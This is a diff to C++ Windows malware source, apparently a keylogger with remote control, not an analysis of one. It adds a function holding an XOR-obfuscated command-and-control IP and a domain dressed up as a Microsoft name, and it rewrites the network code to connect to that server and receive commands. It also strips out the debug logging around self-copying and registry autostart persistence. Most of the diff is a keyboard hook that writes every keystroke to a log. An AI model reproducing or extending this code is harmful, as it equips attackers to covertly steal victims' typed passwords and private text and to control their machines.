@@ -1,9 +1,22 @@
 #include "behave.hpp"
-#include "toolskit.hpp"
-// #include
+/**
+ * Server Infos
+ */
+ServerInfo getServer()
+{
+    char ip[] = "\x31\x36\x30\x2d\x36\x33\x28\x35\x38\x3d\x24\x3a\x3e\x3d";
+    unxor(ip);
+    // forefrontd1.microsoft.ddns.net
+    char dm[] = "\x66\x6e\x70\x66\x62\x77\x69\x69\x7c\x6d\x3b\x25\x61\x64\x6d\x7d\x7f\x62\x7d\x75\x60\x3b\x72\x73\x76\x6a\x34\x75\x79\x69";
+    unxor(dm);
+    int port = 1234;
 
-std::string debugLogPath = getStandardLogPath();
-std::string kegLogPath = getKeyLoggerLogPath();
+    ServerInfo s;
+    s.ServerIp = ip;
+    s.ServerDomainName = dm;
+    s.Port = port;
+    return s;
+}
 
 std::string cpSelf()
 {
@@ -31,10 +44,8 @@ std::string cpSelf()
     BOOL s = CopyFileA(currentPath.c_str(), targetPath.c_str(), false);
     if (s == 1)
     {
-        writeLog("Replicated done ... ", debugLogPath, "Done");
         return targetPath;
     }
-    writeLog("Fail to replicated ... ", debugLogPath, "Fail");
     return "";
 }
 
@@ -82,7 +93,6 @@ bool autoStart(std::string whichToAutoStart)
             success = true;
         }
         RegCloseKey(hKey);
-        writeLog("Register as Shell Start-Up ... ", debugLogPath, "Done");
     }
 
     /**
@@ -97,17 +107,10 @@ bool autoStart(std::string whichToAutoStart)
         if (lKey == ERROR_ACCESS_DENIED)
         {
             lKey = RegOpenKeyExA(KEY_NOT_ADMIN_TARGET, KEY_NOT_ADMIN_STARTUP_REGISTRY, 0, KEY_ALL_ACCESS, &hKey);
-            writeLog("About to register as User-Start-Up ... ", debugLogPath, "Done");
         }
-        else
-        {
-            writeLog("About to register as Admin-Start-Up ... ", debugLogPath, "Done");
-        }
-
         if (lKey == ERROR_SUCCESS)
         {
             RegSetValueExA(hKey, ((std::string)REG_KEY_NAME).c_str(), 0, REG_SZ, (BYTE *)whichToAutoStart.c_str(), strlen(whichToAutoStart.c_str()));
-            writeLog("Register as Non-Shell-Start-Up ... ", debugLogPath, "Done");
         }
     }
 
@@ -131,76 +134,76 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                 switch (vkCode)
                 {
                 case 0x30:
-                    writeLog("[)]", kegLogPath);
+                    writeLog("[)]", KeyLogPath);
                     break;
                 case 0x31:
-                    writeLog("[!]", kegLogPath);
+                    writeLog("[!]", KeyLogPath);
                     break;
                 case 0x32:
-                    writeLog("[@]", kegLogPath);
+                    writeLog("[@]", KeyLogPath);
                     break;
                 case 0x33:
-                    writeLog("[#]", kegLogPath);
+                    writeLog("[#]", KeyLogPath);
                     break;
                 case 0x34:
-                    writeLog("[$]", kegLogPath);
+                    writeLog("[$]", KeyLogPath);
                     break;
                 case 0x35:
-                    writeLog("[%]", kegLogPath);
+                    writeLog("[%]", KeyLogPath);
                     break;
                 case 0x36:
-                    writeLog("[^]", kegLogPath);
+                    writeLog("[^]", KeyLogPath);
                     break;
                 case 0x37:
-                    writeLog("[&]", kegLogPath);
+                    writeLog("[&]", KeyLogPath);
                     break;
                 case 0x38:
-                    writeLog("[*]", kegLogPath);
+                    writeLog("[*]", KeyLogPath);
                     break;
                 case 0x39:
-                    writeLog("[(]", kegLogPath);
+                    writeLog("[(]", KeyLogPath);
                     break;
                 case 0xBF:
-                    writeLog("[?]", kegLogPath); ///
+                    writeLog("[?]", KeyLogPath); ///
                     break;
                 case 0xBB:
-                    writeLog("[+]", kegLogPath);
+                    writeLog("[+]", KeyLogPath);
                     break;
                 case 0xBE:
-                    writeLog("[<]", kegLogPath);
+                    writeLog("[<]", KeyLogPath);
                     break;
                 case 0xBD:
-                    writeLog("[_]", kegLogPath);
+                    writeLog("[_]", KeyLogPath);
                     break;
                 case 0xE2:
-                    writeLog("[>]", kegLogPath);
+                    writeLog("[>]", KeyLogPath);
                     break;
                 case 0x1C:
-                    writeLog("[VK_CONVERT]", kegLogPath);
+                    writeLog("[VK_CONVERT]", KeyLogPath);
                     break;
                 case 0x56:
-                    writeLog("[@]", kegLogPath);
+                    writeLog("[@]", KeyLogPath);
                     break;
                 case 0x2A:
-                    writeLog("[PRINT]", kegLogPath);
+                    writeLog("[PRINT]", KeyLogPath);
                     break;
                 case 0x2E:
-                    writeLog("[Delete]", kegLogPath);
+                    writeLog("[Delete]", KeyLogPath);
                     break;
                 case 0xAA:
-                    writeLog("[Search]", kegLogPath);
+                    writeLog("[Search]", KeyLogPath);
                     break;
                 case 0xF2:
-                    writeLog("[Copy]", kegLogPath);
+                    writeLog("[Copy]", KeyLogPath);
                     break;
                 case 0xFE:
-                    writeLog("[Clear]", kegLogPath);
+                    writeLog("[Clear]", KeyLogPath);
                     break;
                 case 0x3:
-                    writeLog("[Connect]", kegLogPath);
+                    writeLog("[Connect]", KeyLogPath);
                     break;
                 case 0x6:
-                    writeLog("[Logoff]", kegLogPath);
+                    writeLog("[Logoff]", KeyLogPath);
                     break;
                 }
             }
@@ -209,52 +212,52 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                 switch (vkCode)
                 {
                 case 0x30:
-                    writeLog("0", kegLogPath);
+                    writeLog("0", KeyLogPath);
                     break;
                 case 0x31:
-                    writeLog("1", kegLogPath);
+                    writeLog("1", KeyLogPath);
                     break;
                 case 0x32:
-                    writeLog("2", kegLogPath);
+                    writeLog("2", KeyLogPath);
                     break;
                 case 0x33:
-                    writeLog("3", kegLogPath);
+                    writeLog("3", KeyLogPath);
                     break;
                 case 0x34:
-                    writeLog("4", kegLogPath);
+                    writeLog("4", KeyLogPath);
                     break;
                 case 0x35:
-                    writeLog("5", kegLogPath);
+                    writeLog("5", KeyLogPath);
                     break;
                 case 0x36:
-                    writeLog("6", kegLogPath);
+                    writeLog("6", KeyLogPath);
                     break;
                 case 0x37:
-                    writeLog("7", kegLogPath);
+                    writeLog("7", KeyLogPath);
                     break;
                 case 0x38:
-                    writeLog("8", kegLogPath);
+                    writeLog("8", KeyLogPath);
                     break;
                 case 0x39:
-                    writeLog("9", kegLogPath);
+                    writeLog("9", KeyLogPath);
                     break;
                 case 0xBF:
-                    writeLog("/", kegLogPath);
+                    writeLog("/", KeyLogPath);
                     break;
                 case 0xBB:
-                    writeLog("=", kegLogPath);
+                    writeLog("=", KeyLogPath);
                     break;
                 case 0xBC:
-                    writeLog(",", kegLogPath);
+                    writeLog(",", KeyLogPath);
                     break;
                 case 0xBE:
-                    writeLog(".", kegLogPath);
+                    writeLog(".", KeyLogPath);
                     break;
                 case 0xBD:
-                    writeLog("-", kegLogPath);
+                    writeLog("-", KeyLogPath);
                     break;
                 case 0xE2:
-                    writeLog("<", kegLogPath);
+                    writeLog("<", KeyLogPath);
                     break;
                 }
             }
@@ -264,97 +267,97 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                 switch (vkCode)
                 {
                 case 0x41:
-                    writeLog("a", kegLogPath);
+                    writeLog("a", KeyLogPath);
                     break;
                 case 0x42:
-                    writeLog("b", kegLogPath);
+                    writeLog("b", KeyLogPath);
                     break;
                 case 0x43:
-                    writeLog("c", kegLogPath);
+                    writeLog("c", KeyLogPath);
                     break;
                 case 0xBA:
-                    writeLog("č", kegLogPath);
+                    writeLog("č", KeyLogPath);
                     break;
                 case 0x44:
-                    writeLog("d", kegLogPath);
+                    writeLog("d", KeyLogPath);
                     break;
                 case 0x45:
-                    writeLog("e", kegLogPath);
+                    writeLog("e", KeyLogPath);
                     break;
                 case 0x46:
-                    writeLog("f", kegLogPath);
+                    writeLog("f", KeyLogPath);
                     break;
                 case 0x47:
-                    writeLog("g", kegLogPath);
+                    writeLog("g", KeyLogPath);
                     break;
                 case 0x48:
-                    writeLog("h", kegLogPath);
+                    writeLog("h", KeyLogPath);
                     break;
                 case 0x49:
-                    writeLog("i", kegLogPath);
+                    writeLog("i", KeyLogPath);
                     break;
                 case 0x4A:
-                    writeLog("j", kegLogPath);
+                    writeLog("j", KeyLogPath);
                     break;
                 case 0x4B:
-                    writeLog("k", kegLogPath);
+                    writeLog("k", KeyLogPath);
                     break;
                 case 0x4C:
-                    writeLog("l", kegLogPath);
+                    writeLog("l", KeyLogPath);
                     break;
                 case 0x4D:
-                    writeLog("m", kegLogPath);
+                    writeLog("m", KeyLogPath);
                     break;
                 case 0x4E:
-                    writeLog("n", kegLogPath);
+                    writeLog("n", KeyLogPath);
                     break;
                 case 0x4F:
-                    writeLog("o", kegLogPath);
+                    writeLog("o", KeyLogPath);
                     break;
                 case 0x50:
-                    writeLog("p", kegLogPath);
+                    writeLog("p", KeyLogPath);
                     break;
                 case 0x52:
-                    writeLog("r", kegLogPath);
+                    writeLog("r", KeyLogPath);
                     break;
                 case 0x53:
-                    writeLog("s", kegLogPath);
+                    writeLog("s", KeyLogPath);
                     break;
                 case 0x54:
-                    writeLog("t", kegLogPath);
+                    writeLog("t", KeyLogPath);
                     break;
                 case 0x55:
-                    writeLog("u", kegLogPath);
+                    writeLog("u", KeyLogPath);
                     break;
                 case 0x56:
-                    writeLog("v", kegLogPath);
+                    writeLog("v", KeyLogPath);
                     break;
                 case 0x5A:
-                    writeLog("z", kegLogPath);
+                    writeLog("z", KeyLogPath);
                     break;
                 case 0xDC:
-                    writeLog("\\", kegLogPath);
+                    writeLog("\\", KeyLogPath);
                     break;
                 case 0x51:
-                    writeLog("q", kegLogPath);
+                    writeLog("q", KeyLogPath);
                     break;
                 case 0x57:
-                    writeLog("w", kegLogPath);
+                    writeLog("w", KeyLogPath);
                     break;
                 case 0x59:
-                    writeLog("y", kegLogPath);
+                    writeLog("y", KeyLogPath);
                     break;
                 case 0x58:
-                    writeLog("x", kegLogPath);
+                    writeLog("x", KeyLogPath);
                     break;
                 case 0xDE:
-                    writeLog("ć", kegLogPath);
+                    writeLog("ć", KeyLogPath);
                     break;
                 case 0xDD:
-                    writeLog("đ", kegLogPath);
+                    writeLog("đ", KeyLogPath);
                     break;
                 default:
-                    writeLog(" ", kegLogPath);
+                    writeLog(" ", KeyLogPath);
                 }
             }
 
@@ -364,88 +367,88 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                 switch (vkCode)
                 {
                 case 0x41:
-                    writeLog("A", kegLogPath);
+                    writeLog("A", KeyLogPath);
                     break;
                 case 0x42:
-                    writeLog("B", kegLogPath);
+                    writeLog("B", KeyLogPath);
                     break;
                 case 0x43:
-                    writeLog("C", kegLogPath);
+                    writeLog("C", KeyLogPath);
                     break;
                 case 0xBA:
-                    writeLog("č", kegLogPath);
+                    writeLog("č", KeyLogPath);
                     break;
                 case 0x44:
-                    writeLog("D", kegLogPath);
+                    writeLog("D", KeyLogPath);
                     break;
                 case 0x45:
-                    writeLog("E", kegLogPath);
+                    writeLog("E", KeyLogPath);
                     break;
                 case 0x46:
-                    writeLog("F", kegLogPath);
+                    writeLog("F", KeyLogPath);
                     break;
                 case 0x47:
-                    writeLog("G", kegLogPath);
+                    writeLog("G", KeyLogPath);
                     break;
                 case 0x48:
-                    writeLog("H", kegLogPath);
+                    writeLog("H", KeyLogPath);
                     break;
                 case 0x49:
-                    writeLog("I", kegLogPath);
+                    writeLog("I", KeyLogPath);
                     break;
                 case 0x4A:
-                    writeLog("J", kegLogPath);
+                    writeLog("J", KeyLogPath);
                     break;
                 case 0x4B:
-                    writeLog("K", kegLogPath);
+                    writeLog("K", KeyLogPath);
                     break;
                 case 0x4C:
-                    writeLog("L", kegLogPath);
+                    writeLog("L", KeyLogPath);
                     break;
                 case 0x4D:
-                    writeLog("M", kegLogPath);
+                    writeLog("M", KeyLogPath);
                     break;
                 case 0x4E:
-                    writeLog("N", kegLogPath);
+                    writeLog("N", KeyLogPath);
                     break;
                 case 0x4F:
-                    writeLog("O", kegLogPath);
+                    writeLog("O", KeyLogPath);
                     break;
                 case 0x50:
-                    writeLog("P", kegLogPath);
+                    writeLog("P", KeyLogPath);
                     break;
                 case 0x52:
-                    writeLog("R", kegLogPath);
+                    writeLog("R", KeyLogPath);
                     break;
                 case 0x53:
-                    writeLog("S", kegLogPath);
+                    writeLog("S", KeyLogPath);
                     break;
                 case 0x54:
-                    writeLog("T", kegLogPath);
+                    writeLog("T", KeyLogPath);
                     break;
                 case 0x55:
-                    writeLog("U", kegLogPath);
+                    writeLog("U", KeyLogPath);
                     break;
                 case 0x56:
-                    writeLog("V", kegLogPath);
+                    writeLog("V", KeyLogPath);
                     break;
                 case 0x5A:
-                    writeLog("Z", kegLogPath);
+                    writeLog("Z", KeyLogPath);
                     break;
                 case 0x51:
-                    writeLog("Q", kegLogPath);
+                    writeLog("Q", KeyLogPath);
                     break;
                 case 0x57:
-                    writeLog("W", kegLogPath);
+                    writeLog("W", KeyLogPath);
                     break;
                 case 0x59:
-                    writeLog("Y", kegLogPath);
+                    writeLog("Y", KeyLogPath);
                     break;
                 case 0x58:
-                    writeLog("X", kegLogPath);
+                    writeLog("X", KeyLogPath);
                     break;
                 default:
-                    writeLog(" ", kegLogPath);
+                    writeLog(" ", KeyLogPath);
                 }
             }
 
@@ -455,178 +458,178 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             switch (vkCode)
             {
             case VK_SPACE:
-                writeLog("[Space]", kegLogPath);
+                writeLog("[Space]", KeyLogPath);
                 break;
             case 0x2E:
-                writeLog("[Delete]", kegLogPath);
+                writeLog("[Delete]", KeyLogPath);
                 break;
             case VK_BACK:
-                writeLog("[BackSpace]", kegLogPath);
+                writeLog("[BackSpace]", KeyLogPath);
                 break;
             case VK_RETURN:
-                writeLog("[Enter]\n", kegLogPath);
+                writeLog("[Enter]\n", KeyLogPath);
                 break;
             case VK_LCONTROL:
-                writeLog("[Ctrl]", kegLogPath);
+                writeLog("[Ctrl]", KeyLogPath);
                 break;
             case VK_RCONTROL:
-                writeLog("[Ctrl]", kegLogPath);
+                writeLog("[Ctrl]", KeyLogPath);
                 break;
             case VK_TAB:
-                writeLog("[Tab]", kegLogPath);
+                writeLog("[Tab]", KeyLogPath);
                 break;
             case 0x25:
-                writeLog("[Left Arrow]", kegLogPath);
+                writeLog("[Left Arrow]", KeyLogPath);
                 break;
             case 0x26:
-                writeLog("[Up Arrow]", kegLogPath);
+                writeLog("[Up Arrow]", KeyLogPath);
                 break;
             case 0x27:
-                writeLog("[Right Arrow]", kegLogPath);
+                writeLog("[Right Arrow]", KeyLogPath);
                 break;
             case 0x28:
-                writeLog("[Down Arrow]", kegLogPath);
+                writeLog("[Down Arrow]", KeyLogPath);
                 break;
             case VK_ESCAPE:
-                writeLog("[Esc]", kegLogPath);
+                writeLog("[Esc]", KeyLogPath);
                 break;
             case VK_CAPITAL:
-                writeLog("[Caps Lock]", kegLogPath);
+                writeLog("[Caps Lock]", KeyLogPath);
                 break;
             case VK_RSHIFT:
-                writeLog("[Right Shift]", kegLogPath);
+                writeLog("[Right Shift]", KeyLogPath);
                 break;
             case VK_LSHIFT:
-                writeLog("[Left Shift]", kegLogPath);
+                writeLog("[Left Shift]", KeyLogPath);
                 break;
             case VK_LMENU:
-                writeLog("[Left Alt]", kegLogPath);
+                writeLog("[Left Alt]", KeyLogPath);
                 break;
             case VK_RMENU:
-                writeLog("[Right Alt]", kegLogPath);
+                writeLog("[Right Alt]", KeyLogPath);
                 break;
             case VK_LWIN:
-                writeLog("[Left Win]", kegLogPath);
+                writeLog("[Left Win]", KeyLogPath);
                 break;
             case VK_RWIN:
-                writeLog("[Right Win]", kegLogPath);
+                writeLog("[Right Win]", KeyLogPath);
                 break;
             case VK_INSERT:
-                writeLog("[Insert]", kegLogPath);
+                writeLog("[Insert]", KeyLogPath);
                 break;
             case VK_SCROLL:
-                writeLog("[Scroll Lock]", kegLogPath);
+                writeLog("[Scroll Lock]", KeyLogPath);
                 break;
             case VK_HOME:
-                writeLog("[Home]", kegLogPath);
+                writeLog("[Home]", KeyLogPath);
                 break;
             case VK_END:
-                writeLog("[End]", kegLogPath);
+                writeLog("[End]", KeyLogPath);
                 break;
             case VK_PRIOR:
-                writeLog("[Page Up]", kegLogPath);
+                writeLog("[Page Up]", KeyLogPath);
                 break;
             case VK_NEXT:
-                writeLog("[Page Down]", kegLogPath);
+                writeLog("[Page Down]", KeyLogPath);
                 break;
             case VK_SNAPSHOT:
-                writeLog("[Print Screen]", kegLogPath);
+                writeLog("[Print Screen]", KeyLogPath);
                 break;
             case VK_OEM_3:
-                writeLog("[ ~ ` ]", kegLogPath);
+                writeLog("[ ~ ` ]", KeyLogPath);
                 break;
             case VK_OEM_4:
-                writeLog("[ { [ ]", kegLogPath);
+                writeLog("[ { [ ]", KeyLogPath);
                 break;
             case VK_OEM_6:
-                writeLog("[ } ] ]", kegLogPath);
+                writeLog("[ } ] ]", KeyLogPath);
                 break;
             case VK_OEM_1:
-                writeLog("[ : ; ]", kegLogPath);
+                writeLog("[ : ; ]", KeyLogPath);
                 break;
             case VK_OEM_7:
-                writeLog("[ \" ' ]", kegLogPath);
+                writeLog("[ \" ' ]", KeyLogPath);
                 break;
             case VK_F1:
-                writeLog("[F1]", kegLogPath);
+                writeLog("[F1]", KeyLogPath);
                 break;
             case VK_F2:
-                writeLog("[F2]", kegLogPath);
+                writeLog("[F2]", KeyLogPath);
                 break;
             case VK_F3:
-                writeLog("[F3]", kegLogPath);
+                writeLog("[F3]", KeyLogPath);
                 break;
             case VK_F4:
-                writeLog("[F4]", kegLogPath);
+                writeLog("[F4]", KeyLogPath);
                 break;
             case VK_F5:
-                writeLog("[F5]", kegLogPath);
+                writeLog("[F5]", KeyLogPath);
                 break;
             case VK_F6:
-                writeLog("[F6]", kegLogPath);
+                writeLog("[F6]", KeyLogPath);
                 break;
             case VK_F7:
-                writeLog("[F7]", kegLogPath);
+                writeLog("[F7]", KeyLogPath);
                 break;
             case VK_F8:
-                writeLog("[F8]", kegLogPath);
+                writeLog("[F8]", KeyLogPath);
                 break;
             case VK_F9:
-                writeLog("[F9]", kegLogPath);
+                writeLog("[F9]", KeyLogPath);
                 break;
             case VK_F10:
-                writeLog("[F10]", kegLogPath);
+                writeLog("[F10]", KeyLogPath);
                 break;
             case VK_F11:
-                writeLog("[F11]", kegLogPath);
+                writeLog("[F11]", KeyLogPath);
                 break;
             case VK_F12:
-                writeLog("[F12]", kegLogPath);
+                writeLog("[F12]", KeyLogPath);
                 break;
             case VK_NUMPAD0:
-                writeLog("0", kegLogPath);
+                writeLog("0", KeyLogPath);
                 break;
             case VK_NUMPAD1:
-                writeLog("1", kegLogPath);
+                writeLog("1", KeyLogPath);
                 break;
             case VK_NUMPAD2:
-                writeLog("2", kegLogPath);
+                writeLog("2", KeyLogPath);
                 break;
             case VK_NUMPAD3:
-                writeLog("3", kegLogPath);
+                writeLog("3", KeyLogPath);
                 break;
             case VK_NUMPAD4:
-                writeLog("4", kegLogPath);
+                writeLog("4", KeyLogPath);
                 break;
             case VK_NUMPAD5:
-                writeLog("5", kegLogPath);
+                writeLog("5", KeyLogPath);
                 break;
             case VK_NUMPAD6:
-                writeLog("6", kegLogPath);
+                writeLog("6", KeyLogPath);
                 break;
             case VK_NUMPAD7:
-                writeLog("7", kegLogPath);
+                writeLog("7", KeyLogPath);
                 break;
             case VK_NUMPAD8:
-                writeLog("8", kegLogPath);
+                writeLog("8", KeyLogPath);
                 break;
             case VK_NUMPAD9:
-                writeLog("9", kegLogPath);
+                writeLog("9", KeyLogPath);
                 break;
             case 0x6F:
-                writeLog("[/]", kegLogPath);
+                writeLog("[/]", KeyLogPath);
                 break;
             case 0x6A:
-                writeLog("[*]", kegLogPath);
+                writeLog("[*]", KeyLogPath);
                 break;
             case 0x6D:
-                writeLog("[-]", kegLogPath);
+                writeLog("[-]", KeyLogPath);
                 break;
             case 0x6B:
-                writeLog("[+]", kegLogPath);
+                writeLog("[+]", KeyLogPath);
                 break;
             case 0x6E:
-                writeLog("[,]", kegLogPath);
+                writeLog("[,]", KeyLogPath);
                 break;
             }
         }
@@ -638,25 +641,25 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                 switch (vkCode)
                 {
                 case 0x51:
-                    writeLog("[\\]", kegLogPath);
+                    writeLog("[\\]", KeyLogPath);
                     break;
                 case 0x57:
-                    writeLog("[|]", kegLogPath);
+                    writeLog("[|]", KeyLogPath);
                     break;
                 case 0xDB:
-                    writeLog("[{]", kegLogPath);
+                    writeLog("[{]", KeyLogPath);
                     break;
                 case 0xDD:
-                    writeLog("[}]", kegLogPath);
+                    writeLog("[}]", KeyLogPath);
                     break;
                 case 0xDC:
-                    writeLog("[|]", kegLogPath);
+                    writeLog("[|]", KeyLogPath);
                     break;
                 case 0x56:
-                    writeLog("[@]", kegLogPath);
+                    writeLog("[@]", KeyLogPath);
                     break;
                 case 0xBE:
-                    writeLog("[>]", kegLogPath);
+                    writeLog("[>]", KeyLogPath);
                     break;
                 }
             }
@@ -697,59 +700,28 @@ HANDLE startKeyLogging()
     return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0, NULL);
 }
 
-DWORD WINAPI Connector(ServerInfo sInfo)
+DWORD WINAPI Connector(LPVOID lpParameter)
 {
+
     /**
-     * Winsock startup
+     * Get server infos
      */
-    WSAData data;
-    DWORD sockVer = MAKEWORD(2, 2);
-    int wsResult = WSAStartup(sockVer, &data);
-    if (wsResult != 0)
-    {
-        return 0;
-    }
-    // Create socket
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock == INVALID_SOCKET)
-    {
-        WSACleanup();
-        return 0;
-    }
+    ServerInfo sInfo = getServer();
 
-    writeLog("Server Ip: "+sInfo.ServerIp, debugLogPath, "Test");
+    csocket::Socket sock(sInfo.ServerIp, sInfo.Port);
 
-    std::cout<<sInfo.ServerIp<<std::endl;
-    std::cout<<sInfo.Port<<std::endl;
+    sock.Init();
+    sock.Connect();
 
-/**
- * We will use IP address in debug mode
- */
-#ifdef REPORTER_DEBUG
-    // Setup address
-    sockaddr_in hint;
-    hint.sin_family = AF_INET;
-    hint.sin_port = htons(sInfo.Port);
-    inet_pton(AF_INET, sInfo.ServerIp.c_str(), &hint.sin_addr);
+    // Command recieved
+    std::string cmd;
+    sock.Recv(&cmd);
 
-    // Connect to server
-    int connResult = connect(sock, (sockaddr *)&hint, sizeof(hint));
-    if (connResult == SOCKET_ERROR)
-    {
-        writeLog("Fail to connect to server ... ", debugLogPath, "Fail");
-        closesocket(sock);
-        WSACleanup();
-        return 0;
-    }
-    writeLog("Successfully connect to server ... ", debugLogPath, "Done");
-/**
- * Use domain name if C2 is ready
- */
-#elif
-#endif
+    
+    return 0;
 }
 
-HANDLE startNetworking(ServerInfo sInfo)
+HANDLE startNetworking()
 {
-    return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Connector, &sInfo, 0, NULL);
+    return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Connector, NULL, 0, NULL);
 }
